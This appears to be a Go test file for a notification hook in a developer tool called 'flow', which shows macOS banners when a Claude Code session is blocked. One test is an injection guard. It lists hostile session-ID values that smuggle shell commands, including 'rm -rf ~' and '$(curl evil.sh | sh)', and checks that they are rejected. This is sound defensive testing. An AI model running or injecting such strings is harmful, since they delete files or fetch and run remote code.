package app

import (
	"encoding/json"
	"flow/internal/notify"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

const testSessionUUID = "3123e5ff-01ed-4d8f-b5f2-4b75020d3f0f"

// stubNotify captures notify.Notify calls and forces the
// terminal-notifier-present branch so Request fields are observable.
func stubNotify(t *testing.T) *[]notify.Request {
	t.Helper()
	var reqs []notify.Request

	oldLook := notify.LookPath
	notify.LookPath = func(string) (string, error) { return "/usr/local/bin/terminal-notifier", nil }
	t.Cleanup(func() { notify.LookPath = oldLook })

	oldRunner := notify.Runner
	notify.Runner = func(name string, args ...string) error {
		req := notify.Request{}
		for i := 0; i+1 < len(args); i += 2 {
			switch args[i] {
			case "-title":
				req.Title = args[i+1]
			case "-subtitle":
				req.Subtitle = args[i+1]
			case "-message":
				req.Message = args[i+1]
			case "-execute":
				req.Execute = args[i+1]
			case "-group":
				req.Group = args[i+1]
			case "-sound":
				req.Sound = args[i+1]
			}
		}
		reqs = append(reqs, req)
		return nil
	}
	t.Cleanup(func() { notify.Runner = oldRunner })

	return &reqs
}

// runNotificationHook feeds a payload to the hook via a temp file on
// stdin and returns the exit code.
func runNotificationHook(t *testing.T, payload string) int {
	t.Helper()
	f, err := os.CreateTemp(t.TempDir(), "payload-*.json")
	if err != nil {
		t.Fatalf("temp file: %v", err)
	}
	if _, err := f.WriteString(payload); err != nil {
		t.Fatalf("write payload: %v", err)
	}
	if _, err := f.Seek(0, 0); err != nil {
		t.Fatalf("seek: %v", err)
	}
	oldStdin := os.Stdin
	os.Stdin = f
	defer func() { os.Stdin = oldStdin; f.Close() }()

	return cmdHookNotification(nil)
}

func payloadJSON(t *testing.T, notificationType, message, sessionID string) string {
	t.Helper()
	b, err := json.Marshal(notificationPayload{
		SessionID:        sessionID,
		HookEventName:    "Notification",
		NotificationType: notificationType,
		Message:          message,
		CWD:              "/tmp/repo",
	})
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	return string(b)
}

// TestNotificationHookFiresOnBlockingTypes — the two types that mean
// "blocked waiting on a human" must produce a banner.
func TestNotificationHookFiresOnBlockingTypes(t *testing.T) {
	for _, nt := range []string{"permission_prompt", "idle_prompt"} {
		t.Run(nt, func(t *testing.T) {
			reqs := stubNotify(t)
			rc := runNotificationHook(t, payloadJSON(t, nt, "Claude needs your input", testSessionUUID))
			if rc != 0 {
				t.Errorf("rc=%d, want 0", rc)
			}
			if len(*reqs) != 1 {
				t.Fatalf("expected 1 notification, got %d", len(*reqs))
			}
			if (*reqs)[0].Message != "Claude needs your input" {
				t.Errorf("message = %q", (*reqs)[0].Message)
			}
		})
	}
}

// TestNotificationHookIgnoresOtherTypes — Claude Code emits several
// other notification_type values. Banners for those would be noise, so
// the hook must stay silent even if settings.json has no matcher.
func TestNotificationHookIgnoresOtherTypes(t *testing.T) {
	others := []string{
		"auth_success", "elicitation_dialog", "elicitation_complete",
		"elicitation_response", "agent_needs_input", "agent_completed",
		"", "something_new_in_a_future_release",
	}
	for _, nt := range others {
		t.Run(nt, func(t *testing.T) {
			reqs := stubNotify(t)
			rc := runNotificationHook(t, payloadJSON(t, nt, "should not notify", testSessionUUID))
			if rc != 0 {
				t.Errorf("rc=%d, want 0", rc)
			}
			if len(*reqs) != 0 {
				t.Errorf("expected no notification for %q, got %d", nt, len(*reqs))
			}
		})
	}
}

// TestNotificationHookMalformedInput — a hook that errors on every
// prompt is worse than no hook, so bad input exits 0 silently.
func TestNotificationHookMalformedInput(t *testing.T) {
	cases := map[string]string{
		"empty":          "",
		"whitespace":     "   \n  ",
		"not json":       "this is not json at all",
		"truncated json": `{"session_id": "abc"`,
		"json array":     `["wrong", "shape"]`,
		"null":           "null",
		"wrong types":    `{"notification_type": 42, "message": []}`,
	}
	for name, payload := range cases {
		t.Run(name, func(t *testing.T) {
			reqs := stubNotify(t)
			if rc := runNotificationHook(t, payload); rc != 0 {
				t.Errorf("rc=%d, want 0 — a Notification hook must never fail loud", rc)
			}
			if len(*reqs) != 0 {
				t.Errorf("malformed input must not notify, got %d", len(*reqs))
			}
		})
	}
}

// TestBuildNotificationUnboundSession — a session flow doesn't track
// still gets a banner; it just can't be labelled with a task, so the
// cwd stands in as the subtitle.
func TestBuildNotificationUnboundSession(t *testing.T) {
	t.Setenv("FLOW_ROOT", filepath.Join(t.TempDir(), "nonexistent"))

	req := buildNotification(notificationPayload{
		SessionID:        testSessionUUID,
		NotificationType: "permission_prompt",
		Message:          "May I edit main.go?",
		CWD:              "/tmp/some/repo",
	})
	if req.Title != "flow" {
		t.Errorf("title = %q; want the bare fallback %q", req.Title, "flow")
	}
	if req.Subtitle != "/tmp/some/repo" {
		t.Errorf("subtitle = %q; want the cwd", req.Subtitle)
	}
	if req.Message != "May I edit main.go?" {
		t.Errorf("message = %q", req.Message)
	}
}

// TestBuildNotificationDefaultMessages — idle_prompt often arrives with
// an empty message; a bodyless banner would be dropped by macOS, so a
// sensible default is substituted per type.
func TestBuildNotificationDefaultMessages(t *testing.T) {
	t.Setenv("FLOW_ROOT", filepath.Join(t.TempDir(), "nonexistent"))

	cases := map[string]string{
		"idle_prompt":       "Waiting for your input.",
		"permission_prompt": "Needs permission to continue.",
	}
	for nt, want := range cases {
		req := buildNotification(notificationPayload{
			SessionID:        testSessionUUID,
			NotificationType: nt,
			Message:          "   ",
		})
		if req.Message != want {
			t.Errorf("%s: message = %q; want %q", nt, req.Message, want)
		}
	}
}

// TestFocusCommandRejectsNonUUID is the injection guard. terminal-
// notifier hands -execute to a shell, so anything that isn't a strict
// UUID must produce no click command at all rather than being quoted
// and hoped for.
func TestFocusCommandRejectsNonUUID(t *testing.T) {
	malicious := []string{
		"; rm -rf ~",
		"$(curl evil.sh | sh)",
		"`whoami`",
		"abc && open -a Calculator",
		"3123e5ff-01ed-4d8f-b5f2-4b75020d3f0f; echo pwned",
		"../../etc/passwd",
		"",
		"not-a-uuid",
	}
	for _, in := range malicious {
		if got := focusCommand(in); got != "" {
			t.Errorf("focusCommand(%q) = %q; want \"\" — non-UUID input must never reach a shell", in, got)
		}
	}

	// The legitimate shape still produces a command, ending in the
	// session id.
	got := focusCommand(testSessionUUID)
	if !strings.HasSuffix(got, " focus "+testSessionUUID) {
		t.Errorf("focusCommand(valid) = %q; want it to end in ` focus <uuid>`", got)
	}

	// The binary must be referenced by ABSOLUTE, QUOTED path — not a
	// bare `flow`. terminal-notifier's click handler runs with the
	// system default PATH and does not source shell rc files, so a bare
	// `flow` silently does nothing when the banner is clicked. Quoting
	// matters because checkout paths legitimately contain spaces.
	if strings.HasPrefix(got, "flow ") {
		t.Error("click command must not rely on PATH — it runs in a minimal env where flow is not found")
	}
	if !strings.HasPrefix(got, "'/") {
		t.Errorf("click command must start with a single-quoted absolute path; got %q", got)
	}
}

// TestShellQuote covers the quoting that keeps a checkout path with
// spaces (this repo lives under "Facets Work") from splitting into
// separate shell words when terminal-notifier runs -execute.
func TestShellQuote(t *testing.T) {
	cases := map[string]string{
		`/usr/local/bin/flow`:       `'/usr/local/bin/flow'`,
		`/Users/x/Facets Work/flow`: `'/Users/x/Facets Work/flow'`,
		`/tmp/it's/flow`:            `'/tmp/it'\''s/flow'`,
		``:                          `''`,
	}
	for in, want := range cases {
		if got := shellQuote(in); got != want {
			t.Errorf("shellQuote(%q) = %s; want %s", in, got, want)
		}
	}
}

// TestNotificationGroupIsPerSession — banners group by session so a
// chatty session replaces its own banner instead of burying the others.
func TestNotificationGroupIsPerSession(t *testing.T) {
	a := notificationGroup(testSessionUUID)
	b := notificationGroup("99999999-8888-4777-8666-555555555555")
	if a == b {
		t.Error("distinct sessions must get distinct groups")
	}
	if a != "flow-"+testSessionUUID {
		t.Errorf("group = %q", a)
	}
	if got := notificationGroup("garbage"); got != "flow" {
		t.Errorf("invalid session group = %q; want the %q fallback", got, "flow")
	}
}

// TestShortenPath collapses $HOME so a subtitle doesn't waste width.
func TestShortenPath(t *testing.T) {
	home, err := os.UserHomeDir()
	if err != nil {
		t.Skip("no home dir")
	}
	cases := map[string]string{
		home:                        "~",
		filepath.Join(home, "repo"): filepath.Join("~", "repo"),
		"/tmp/elsewhere":            "/tmp/elsewhere",
		home + "-not-actually-home": home + "-not-actually-home",
	}
	for in, want := range cases {
		if got := shortenPath(in); got != want {
			t.Errorf("shortenPath(%q) = %q; want %q", in, got, want)
		}
	}
}

// TestNotifyAutoRun — autonomous runs have no tab, so completion and
// death both need a banner, and neither carries a click action.
func TestNotifyAutoRun(t *testing.T) {
	t.Run("completed", func(t *testing.T) {
		reqs := stubNotify(t)
		notifyAutoRun("my-task", "completed", "/tmp/run.log")
		if len(*reqs) != 1 {
			t.Fatalf("expected 1 notification, got %d", len(*reqs))
		}
		r := (*reqs)[0]
		if !strings.Contains(r.Title, "my-task") {
			t.Errorf("title = %q; want the task slug", r.Title)
		}
		if r.Execute != "" {
			t.Errorf("auto-run banners have no tab to focus; Execute = %q", r.Execute)
		}
	})

	t.Run("dead includes log path", func(t *testing.T) {
		reqs := stubNotify(t)
		notifyAutoRun("my-task", "dead", "/tmp/run.log")
		if len(*reqs) != 1 {
			t.Fatalf("expected 1 notification, got %d", len(*reqs))
		}
		if !strings.Contains((*reqs)[0].Message, "/tmp/run.log") {
			t.Errorf("dead banner should point at the log: %q", (*reqs)[0].Message)
		}
	})

	t.Run("non-terminal status is silent", func(t *testing.T) {
		reqs := stubNotify(t)
		notifyAutoRun("my-task", "running", "")
		if len(*reqs) != 0 {
			t.Errorf("only terminal statuses notify, got %d", len(*reqs))
		}
	})
}

// TestEnsureNotifierInstalledSkipsWhenPresent — the dependency install
// is a one-time cost, not per-upgrade work.
func TestEnsureNotifierInstalledSkipsWhenPresent(t *testing.T) {
	oldLook := notify.LookPath
	notify.LookPath = func(string) (string, error) { return "/usr/local/bin/terminal-notifier", nil }
	t.Cleanup(func() { notify.LookPath = oldLook })

	brewCalls := 0
	oldBrew := brewInstallRunner
	brewInstallRunner = func(string) error { brewCalls++; return nil }
	t.Cleanup(func() { brewInstallRunner = oldBrew })

	ensureNotifierInstalled()
	if brewCalls != 0 {
		t.Errorf("must not invoke brew when terminal-notifier is present, got %d calls", brewCalls)
	}
}

// TestEnsureNotifierInstalledNoBrewIsAdvisory — with no Homebrew, flow
// prints guidance rather than failing. It must never try to install a
// package manager.
func TestEnsureNotifierInstalledNoBrew(t *testing.T) {
	oldLook := notify.LookPath
	notify.LookPath = func(string) (string, error) { return "", exec.ErrNotFound }
	t.Cleanup(func() { notify.LookPath = oldLook })

	oldPath := lookPathRunner
	lookPathRunner = func(string) (string, error) { return "", exec.ErrNotFound }
	t.Cleanup(func() { lookPathRunner = oldPath })

	brewCalls := 0
	oldBrew := brewInstallRunner
	brewInstallRunner = func(string) error { brewCalls++; return nil }
	t.Cleanup(func() { brewInstallRunner = oldBrew })

	ensureNotifierInstalled() // must not panic
	if brewCalls != 0 {
		t.Errorf("must not invoke brew when brew is absent, got %d calls", brewCalls)
	}
}

// TestEnsureNotifierInstalledBrewFailureIsNonFatal — a brew failure
// must not fail the caller; `flow init` cannot break over an optional
// dependency.
func TestEnsureNotifierInstalledBrewFailure(t *testing.T) {
	oldLook := notify.LookPath
	notify.LookPath = func(string) (string, error) { return "", exec.ErrNotFound }
	t.Cleanup(func() { notify.LookPath = oldLook })

	oldPath := lookPathRunner
	lookPathRunner = func(string) (string, error) { return "/opt/homebrew/bin/brew", nil }
	t.Cleanup(func() { lookPathRunner = oldPath })

	oldBrew := brewInstallRunner
	brewInstallRunner = func(string) error { return exec.ErrNotFound }
	t.Cleanup(func() { brewInstallRunner = oldBrew })

	ensureNotifierInstalled() // must return normally despite the failure
}

// TestBlockedBannerIgnoresDoNotDisturb — the whole feature is "a session
// is stalled waiting on you", so a Focus mode must not suppress it.
func TestBlockedBannerIgnoresDoNotDisturb(t *testing.T) {
	t.Setenv("FLOW_ROOT", filepath.Join(t.TempDir(), "nonexistent"))

	for _, nt := range []string{"permission_prompt", "idle_prompt"} {
		req := buildNotification(notificationPayload{
			SessionID:        testSessionUUID,
			NotificationType: nt,
			Message:          "needs you",
		})
		if !req.IgnoreDoNotDisturb {
			t.Errorf("%s: blocked-session banner must set IgnoreDoNotDisturb", nt)
		}
	}
}
